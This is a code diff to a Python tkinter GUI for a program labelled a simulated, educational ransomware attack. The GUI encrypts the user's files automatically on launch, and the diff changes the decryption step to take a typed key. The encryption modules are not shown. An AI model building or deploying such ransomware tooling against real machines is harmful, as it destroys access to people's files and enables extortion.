@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import messagebox, filedialog
+from tkinter import messagebox, simpledialog
 from threading import Thread
 import ransomware
 import decryptor
@@ -14,9 +14,6 @@ class RansomwareGUI:
         #Mensagem e botões 
         self.label = tk.Label(master, text="WARNING: This program is a simulated ransomware attack for educational purposes only.")
         self.label.pack(pady=20)
-
-        #self.encrypt_button = tk.Button(master, text="Encrypt Files", command=self.start_encryption)
-        #self.encrypt_button.pack(pady=10)
 
         # Chama a função para encriptar os arquivos assim que a interface é iniciada
         self.start_encryption()
@@ -34,13 +31,18 @@ class RansomwareGUI:
 
     def start_decryption(self):
         # Função para iniciar a descriptografia dos arquivos
-        key_file_path = filedialog.askopenfilename(title="Select Key File", filetypes=[("Key Files", "*.key")])
-        if key_file_path:
-            Thread(target=self.decrypt_files, args=(key_file_path,)).start()
+        key = simpledialog.askstring("Input", "Enter the decryption key:")
+        if key:
+            Thread(target=self.decrypt_files, args=(key.encode(),)).start()
 
-    def decrypt_files(self, key_file_path):
-        decryptor.decrypt_documents_directory(key_file_path)
-        messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")
+    def decrypt_files(self, key):
+        try:
+            decryptor.decrypt_documents_directory(key)
+            messagebox.showinfo("Decryption Complete", "Decryption completed. Your files are now accessible.")
+
+        except Exception:
+            messagebox.showerror("Error", f"Decryption failed: {Exception}")
+
 
 if __name__ == "__main__":
     root = tk.Tk()
